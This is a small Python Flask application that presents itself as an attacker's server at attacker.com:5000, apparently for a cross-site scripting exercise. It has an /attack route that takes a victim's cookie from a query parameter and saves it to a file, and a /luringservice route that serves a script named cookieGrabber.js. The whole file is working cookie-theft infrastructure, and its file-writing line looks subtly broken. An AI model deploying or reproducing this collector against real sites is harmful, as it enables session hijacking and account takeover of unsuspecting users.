from flask import Flask
from flask import render_template
from flask import request

app = Flask(__name__, static_folder='static')

app.config['SERVER_NAME'] = 'attacker.com:5000'

@app.route('/attack')
def attack():
	cookie = request.args.get('cookie')
	with open("test.txt","wb") as fo:
   		fo.write(cookie)
	return render_template('index.html')

@app.route('/luringservice')
def lure():
	return app.send_static_file('cookieGrabber.js')

@app.route('/')
def home_page():
    return render_template('index.html')
